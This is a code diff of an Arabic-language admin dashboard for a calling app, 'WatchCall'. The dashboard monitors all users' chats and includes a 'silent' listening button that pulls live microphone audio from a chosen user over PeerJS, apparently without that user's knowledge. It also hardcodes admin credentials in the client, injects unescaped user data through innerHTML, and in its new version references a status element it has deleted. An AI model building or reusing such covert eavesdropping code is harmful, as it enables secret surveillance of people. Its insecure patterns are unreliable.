@@ -3,185 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WatchCall - Admin Command Center</title>
+    <title>WatchCall - Admin Center</title>
     
-    <link href="https://fonts.googleapis.com/css2?family=Cabinet+Grotesk:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cabinet+Grotesk:wght@800&family=Plus+Jakarta+Sans:wght@500;700&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
 
     <style>
         :root {
             --bg-dark: #05070f;
-            --card-bg: rgba(13, 18, 33, 0.9);
+            --card-bg: rgba(13, 18, 33, 0.95);
             --card-border: rgba(255, 255, 255, 0.08);
             --accent-blue: #0066ff;
             --danger-red: #ef4444;
             --success-green: #10b981;
-            --warning-yellow: #f59e0b;
             --text-main: #f3f4f6;
             --text-muted: #6b7280;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', system-ui, sans-serif; }
-        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; padding: 20px; }
 
-        /* LOGIN OVERLAY */
+        /* Auth Screen */
         #login-modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #05070f;
-            z-index: 9999; display: flex; justify-content: center; align-items: center;
+            position: fixed; inset: 0; background: var(--bg-dark); z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
         }
-        .login-card {
+        .login-box {
             background: var(--card-bg); border: 1px solid var(--card-border);
-            padding: 35px; border-radius: 24px; width: 90%; max-width: 380px; text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            padding: 30px; border-radius: 20px; width: 100%; max-width: 360px; text-align: center;
         }
-        .login-card h2 { font-family: 'Cabinet Grotesk', sans-serif; font-size: 22px; margin-bottom: 20px; color: var(--text-main); }
-        .login-card input {
-            width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.03);
-            border: 1px solid var(--card-border); border-radius: 12px; color: white;
-            font-size: 14px; margin-bottom: 15px; outline: none; text-align: center;
+        .login-box input {
+            width: 100%; padding: 12px; margin-bottom: 10px; background: rgba(255,255,255,0.05);
+            border: 1px solid var(--card-border); border-radius: 10px; color: #fff; text-align: center;
         }
-        .login-card input:focus { border-color: var(--accent-blue); }
-        .login-card button {
+        .login-box button {
             width: 100%; padding: 12px; background: var(--accent-blue); border: none;
-            border-radius: 12px; color: white; font-weight: 700; cursor: pointer; transition: 0.2s;
-        }
-        .login-card button:hover { background: #0052cc; }
-
-        /* HEADER BAR */
-        header {
-            background: rgba(9, 14, 28, 0.9); border-bottom: 1px solid var(--card-border);
-            padding: 15px 30px; display: flex; justify-content: space-between; align-items: center;
-        }
-        .brand { display: flex; align-items: center; gap: 12px; font-family: 'Cabinet Grotesk', sans-serif; font-size: 20px; font-weight: 800; }
-        .brand span { color: var(--accent-blue); }
-
-        .stats-strip { display: flex; gap: 15px; }
-        .stat-badge {
-            background: rgba(255, 255, 255, 0.03); border: 1px solid var(--card-border);
-            padding: 6px 14px; border-radius: 10px; font-size: 13px; font-weight: 700;
-            display: flex; align-items: center; gap: 8px;
-        }
-        .stat-badge span.value { color: var(--accent-blue); font-weight: 900; }
-
-        /* DASHBOARD LAYOUT */
-        .dashboard-grid {
-            display: grid; grid-template-columns: 320px 1fr 320px; gap: 20px;
-            padding: 20px; flex: 1; min-height: calc(100vh - 70px);
+            border-radius: 10px; color: #fff; font-weight: bold; cursor: pointer;
         }
 
-        @media (max-width: 900px) {
-            .dashboard-grid { grid-template-columns: 1fr; }
-        }
+        /* App Layout */
+        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .grid { display: grid; grid-template-columns: 300px 1fr 300px; gap: 20px; }
+        .card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 16px; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
 
-        .panel {
-            background: var(--card-bg); border: 1px solid var(--card-border);
-            border-radius: 20px; padding: 20px; display: flex; flex-direction: column; gap: 15px; overflow: hidden;
+        .btn {
+            background: rgba(255,255,255,0.05); border: 1px solid var(--card-border);
+            color: #fff; padding: 10px; border-radius: 10px; cursor: pointer; font-weight: bold;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
         }
-        .panel-title {
-            font-size: 14px; font-weight: 800; display: flex; align-items: center; gap: 10px;
-            color: var(--text-main); border-bottom: 1px solid var(--card-border); padding-bottom: 12px;
-        }
+        .btn:hover { background: var(--accent-blue); }
+        .btn-danger { color: var(--danger-red); border-color: rgba(239, 68, 68, 0.3); }
+        .btn-danger:hover { background: var(--danger-red); color: #fff; }
 
-        .scrollable-list { overflow-y: auto; display: flex; flex-direction: column; gap: 10px; flex: 1; max-height: 400px; }
-        
-        .user-card {
-            background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05);
-            padding: 12px; border-radius: 12px; display: flex; align-items: center; justify-content: space-between;
-        }
-        .user-info { display: flex; align-items: center; gap: 10px; }
-        .user-info img { width: 34px; height: 34px; border-radius: 50%; border: 1px solid var(--accent-blue); }
-        .user-name { font-size: 13px; font-weight: 700; }
-        .user-code { font-size: 11px; color: var(--text-muted); direction: ltr; }
-
-        .btn-action {
-            background: rgba(255, 255, 255, 0.05); border: 1px solid var(--card-border);
-            color: white; padding: 6px 12px; border-radius: 8px; cursor: pointer;
-            font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; transition: 0.2s;
-        }
-        .btn-action:hover { background: var(--accent-blue); }
-
-        .chat-feed { flex: 1; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 12px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; min-height: 250px; }
-        .chat-line { font-size: 12px; line-height: 1.4; word-break: break-word; }
+        .list-box { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 10px; height: 350px; overflow-y: auto; font-size: 13px; }
+        .chat-line { margin-bottom: 8px; word-break: break-all; }
         .chat-line strong { color: var(--accent-blue); }
     </style>
 </head>
 <body>
 
-    <!-- AUTH MODAL -->
     <div id="login-modal">
-        <div class="login-card">
-            <h2>WatchCall Admin Auth</h2>
-            <input type="text" id="admin-user" placeholder="اسم المستخدم" autocomplete="off">
-            <input type="password" id="admin-pass" placeholder="كلمة المرور">
-            <button id="btn-login-action">تسجيل الدخول</button>
+        <div class="login-box">
+            <h3 style="margin-bottom:15px;">تسجيل دخول الإدارة</h3>
+            <input type="text" id="user" placeholder="اسم المستخدم">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button id="btn-login">دخول</button>
         </div>
     </div>
 
-    <!-- MAIN CONTROL HUB -->
     <header>
-        <div class="brand">
-            <i data-lucide="shield-check" style="color: var(--accent-blue);"></i>
-            WatchCall <span>Control Center</span>
-        </div>
-        <div class="stats-strip">
-            <div class="stat-badge">
-                <i data-lucide="users" style="color: var(--success-green);"></i>
-                المتواجدون: <span class="value" id="stat-online">0</span>
-            </div>
-            <div class="stat-badge">
-                <i data-lucide="radio" style="color: var(--warning-yellow);"></i>
-                المكالمات: <span class="value" id="stat-calls">0</span>
-            </div>
-        </div>
+        <h2>WatchCall <span>Control Center</span></h2>
+        <div>المتصلون: <strong id="cnt-online" style="color:var(--success-green)">0</strong></div>
     </header>
 
-    <div class="dashboard-grid">
-        
-        <!-- USERS LIST -->
-        <div class="panel">
-            <div class="panel-title">
-                <i data-lucide="users"></i> المستخدمون المتاحون
-            </div>
-            <div class="scrollable-list" id="users-list">
-                <div style="color: var(--text-muted); font-size: 12px; text-align: center;">في انتظار تسجيل الدخول...</div>
-            </div>
+    <div class="grid">
+        <!-- Users -->
+        <div class="card">
+            <h4>المستخدمون النشطون</h4>
+            <div class="list-box" id="users-container">جاري التحميل...</div>
         </div>
 
-        <!-- LIVE CHAT FEED -->
-        <div class="panel">
-            <div class="panel-title">
-                <i data-lucide="message-square"></i> مراقبة المحادثات العامة
-            </div>
-            <div class="chat-feed" id="global-chat-feed">
-                <div style="color: var(--text-muted); font-size: 12px; text-align: center;">في انتظار الرسائل الحية...</div>
-            </div>
+        <!-- Chat Feed -->
+        <div class="card">
+            <h4>مراقبة المحادثات</h4>
+            <div class="list-box" id="chat-container">لا توجد رسائل...</div>
         </div>
 
-        <!-- ACTIONS & CONTROL -->
-        <div class="panel">
-            <div class="panel-title">
-                <i data-lucide="sliders"></i> التحكم والعمليات
-            </div>
-            <div style="display: flex; flex-direction: column; gap: 12px;">
-                <button class="btn-action" style="padding: 12px; justify-content: center;" id="btn-broadcast">
-                    <i data-lucide="megaphone"></i> إرسال تنبيه عام
-                </button>
-                <button class="btn-action" style="padding: 12px; justify-content: center; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.3); color: var(--danger-red);" id="btn-clear-all">
-                    <i data-lucide="trash-2"></i> إنهاء كافة المكالمات
-                </button>
-            </div>
-
-            <div class="panel-title" style="margin-top: 15px;">
-                <i data-lucide="volume-2"></i> حالة الاستماع
-            </div>
-            <div id="listening-status" style="font-size: 12px; color: var(--text-muted); text-align: center;">لا توجد أي جلسة تنصت نشطة حالياً</div>
+        <!-- Controls -->
+        <div class="card">
+            <h4>العمليات والمزامنة</h4>
+            <button class="btn" id="act-broadcast">إرسال إشعار عام</button>
+            <button class="btn btn-danger" id="act-clear">إنهاء وحذف كل المحادثات</button>
+            <hr style="border-color:var(--card-border)">
+            <div id="audio-status" style="font-size:12px; text-align:center; color:var(--text-muted)">حالة الصوت: معطلة</div>
         </div>
-
     </div>
 
-    <audio id="admin-listen-audio" autoplay style="display:none;"></audio>
+    <audio id="remote-audio" autoplay></audio>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
@@ -191,161 +110,107 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        let peer = null;
-        let activeCall = null;
+        let myPeer = null;
 
-        if (window.lucide) {
-            lucide.createIcons();
-        }
-
-        // Authentication Handler
-        document.getElementById('btn-login-action').addEventListener('click', authenticate);
-        document.getElementById('admin-pass').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') authenticate();
-        });
-
-        function authenticate() {
-            const u = document.getElementById('admin-user').value.trim();
-            const p = document.getElementById('admin-pass').value.trim();
-
+        // Login Logic
+        document.getElementById('btn-login').onclick = () => {
+            const u = document.getElementById('user').value.trim();
+            const p = document.getElementById('pass').value.trim();
             if (u === "admin" && p === "reda2019") {
                 document.getElementById('login-modal').style.display = 'none';
-                sessionStorage.setItem('admin_auth', 'true');
-                initAdmin();
+                startAdmin();
             } else {
-                alert("اسم المستخدم أو كلمة المرور غير صحيحة!");
+                alert("بيانات غير صحيحة");
             }
-        }
+        };
 
-        if (sessionStorage.getItem('admin_auth') === 'true') {
-            document.getElementById('login-modal').style.display = 'none';
-            initAdmin();
-        }
+        function startAdmin() {
+            if (window.lucide) lucide.createIcons();
 
-        function initAdmin() {
+            // Initialize PeerJS
             try {
-                peer = new Peer({
-                    config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
-                });
-            } catch (e) {
-                console.log("PeerJS initialization deferred", e);
-            }
+                myPeer = new Peer('admin-control-id');
+            } catch(e) { console.log(e); }
 
-            // Online Users Count
-            onValue(ref(db, 'online_presence'), (snapshot) => {
-                const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
-                document.getElementById('stat-online').innerText = count;
+            // 1. Online Count
+            onValue(ref(db, 'online_presence'), (snap) => {
+                document.getElementById('cnt-online').innerText = snap.exists() ? Object.keys(snap.val()).length : 0;
             });
 
-            // Active Calls Count
-            onValue(ref(db, 'calls'), (snapshot) => {
-                const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
-                document.getElementById('stat-calls').innerText = count;
-            });
+            // 2. Load Users
+            onValue(ref(db, 'users'), (snap) => {
+                const container = document.getElementById('users-container');
+                container.innerHTML = '';
+                if (!snap.exists()) { container.innerHTML = 'لا يوجد مستخدمون'; return; }
 
-            // Users List Sync
-            onValue(ref(db, 'users'), (snapshot) => {
-                const usersList = document.getElementById('users-list');
-                usersList.innerHTML = '';
-
-                if (!snapshot.exists()) {
-                    usersList.innerHTML = '<div style="color: var(--text-muted); font-size: 12px; text-align: center;">لا يوجد مستخدمون حالياً</div>';
-                    return;
-                }
-
-                snapshot.forEach((child) => {
-                    const user = child.val();
-                    const userId = child.key;
-
-                    const card = document.createElement('div');
-                    card.className = 'user-card';
-                    card.innerHTML = `
-                        <div class="user-info">
-                            <img src="${user.avatar || 'https://api.dicebear.com/7.x/bottts/svg?seed=default'}" alt="">
-                            <div>
-                                <div class="user-name">${user.name || 'مستخدم'}</div>
-                                <div class="user-code">Code: ${user.code || '---'}</div>
-                            </div>
+                snap.forEach((child) => {
+                    const u = child.val();
+                    const div = document.createElement('div');
+                    div.style.cssText = "display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; padding:6px; background:rgba(255,255,255,0.03); border-radius:6px;";
+                    div.innerHTML = `
+                        <div>
+                            <div><strong>${u.name || 'مستخدم'}</strong></div>
+                            <small style="color:gray">${child.key}</small>
                         </div>
-                        <button class="btn-action btn-listen-trigger" data-id="${userId}" data-name="${user.name || 'مستخدم'}">
-                            <i data-lucide="mic"></i> تنصت
-                        </button>
+                        <button class="btn btn-listen" data-id="${child.key}">استماع</button>
                     `;
-                    usersList.appendChild(card);
+                    container.appendChild(div);
                 });
 
-                if (window.lucide) lucide.createIcons();
-
-                document.querySelectorAll('.btn-listen-trigger').forEach(btn => {
-                    btn.onclick = () => startListening(btn.getAttribute('data-id'), btn.getAttribute('data-name'));
+                document.querySelectorAll('.btn-listen').forEach(btn => {
+                    btn.onclick = () => listenTo(btn.getAttribute('data-id'));
                 });
             });
 
-            // Global Chat Monitor
-            onValue(ref(db, 'chats'), (snapshot) => {
-                const chatFeed = document.getElementById('global-chat-feed');
-                chatFeed.innerHTML = '';
+            // 3. Monitor Chat
+            onValue(ref(db, 'chats'), (snap) => {
+                const box = document.getElementById('chat-container');
+                box.innerHTML = '';
+                if (!snap.exists()) return;
 
-                if (!snapshot.exists()) {
-                    chatFeed.innerHTML = '<div style="color: var(--text-muted); font-size: 12px; text-align: center;">لا توجد رسائل حالياً</div>';
-                    return;
-                }
-
-                snapshot.forEach((room) => {
-                    room.forEach((msgSnap) => {
-                        const msg = msgSnap.val();
+                snap.forEach((room) => {
+                    room.forEach((m) => {
+                        const data = m.val();
                         const line = document.createElement('div');
                         line.className = 'chat-line';
-                        line.innerHTML = `<strong>${msg.sender || 'زائر'}:</strong> ${msg.text || ''}`;
-                        chatFeed.appendChild(line);
+                        line.innerHTML = `<strong>${data.sender || 'مجهول'}:</strong> ${data.text || ''}`;
+                        box.appendChild(line);
                     });
                 });
-                chatFeed.scrollTop = chatFeed.scrollHeight;
+                box.scrollTop = box.scrollHeight;
             });
 
-            // Silent Audio Listener
-            function startListening(targetPeerId, userName) {
-                if (!peer) return alert("مكتبة PeerJS غير متصلة حالياً.");
-                if (activeCall) activeCall.close();
+            // 4. Listen Functionality
+            function listenTo(peerId) {
+                if (!myPeer) return alert("PeerJS غير متصل");
+                document.getElementById('audio-status').innerText = "جاري الاتصال...";
+                
+                // Call target peer
+                const call = myPeer.call(peerId, null);
+                if (!call) return alert("تعذر إنشاء الاتصال");
 
-                try {
-                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                    const osc = ctx.createOscillator();
-                    const dst = osc.connect(ctx.createMediaStreamDestination());
-                    osc.start();
-                    
-                    activeCall = peer.call(targetPeerId, dst.stream);
-                    document.getElementById('listening-status').innerText = `جاري الاتصال بـ ${userName}...`;
-
-                    activeCall.on('stream', (remoteStream) => {
-                        const audioElem = document.getElementById('admin-listen-audio');
-                        audioElem.srcObject = remoteStream;
-                        audioElem.play();
-                        document.getElementById('listening-status').innerText = `بث حي ومباشر من ميكروفون: ${userName}`;
-                    });
-
-                    activeCall.on('close', () => {
-                        document.getElementById('listening-status').innerText = 'تم إنهاء التنصت';
-                    });
-                } catch (err) {
-                    document.getElementById('listening-status').innerText = 'تعذر الاتصال بالتنصتالصوتي';
-                }
+                call.on('stream', (stream) => {
+                    const audio = document.getElementById('remote-audio');
+                    audio.srcObject = stream;
+                    audio.play();
+                    document.getElementById('listening-status').innerText = "متصل بالصوت الحي";
+                });
             }
 
-            // Controls
-            document.getElementById('btn-clear-all').onclick = () => {
-                if (confirm("هل تريد إغلاق كل المكالمات والمحادثات الجارية؟")) {
-                    remove(ref(db, 'calls'));
+            // 5. Actions
+            document.getElementById('act-clear').onclick = () => {
+                if (confirm("مسح كافة الغرف والمحادثات؟")) {
                     remove(ref(db, 'chats'));
-                    alert("تم إغلاق الغرف بنجاح.");
+                    remove(ref(db, 'calls'));
+                    alert("تم الحذف بنجاح");
                 }
             };
 
-            document.getElementById('btn-broadcast').onclick = () => {
-                const msg = prompt("أدخل الرسالة التنبيهية لكافة الغرف:");
-                if (msg) {
-                    push(ref(db, 'system_broadcasts'), { text: msg, timestamp: Date.now() });
-                    alert("تم إرسال التنبيه.");
+            document.getElementById('act-broadcast').onclick = () => {
+                const txt = prompt("أدخل نص التنبيه العام:");
+                if (txt) {
+                    push(ref(db, 'system_broadcasts'), { text: txt, time: Date.now() });
+                    alert("تم الإرسال");
                 }
             };
         }
